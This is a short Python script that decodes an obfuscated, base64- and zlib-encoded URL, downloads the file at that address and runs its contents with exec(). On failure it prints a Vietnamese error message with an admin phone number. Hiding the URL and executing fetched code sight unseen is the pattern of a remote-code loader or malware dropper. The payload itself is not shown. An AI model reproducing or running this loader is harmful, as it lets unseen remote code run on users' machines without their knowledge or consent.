import base64
import zlib
import requests
import io
encoded_data = "eJwNyjEOgDAIAMAfgSQuuvoHdySNMJSSlsb4e735NDPGjtj5gdtS5zVH6dI8iydIq3ia60ZEeHSLsQDBipXN8U/CAvF+W3cYIA=="
decoded_data = base64.b64decode(encoded_data)
decompressed_data = zlib.decompress(decoded_data).decode()
url = decompressed_data.strip() 
response = requests.get(url)
if response.status_code == 200:
    file_content = response.content.decode()
    exec(file_content)
else:
    print(r"""
Ôi Không Hình Như Code Đã Bị Lỗi!!!
Bạn Hãy Liên Hệ Admin Để Được Xử Lí !
Sdt: 0932197401                                                                                                                                                                                                                                             
""")
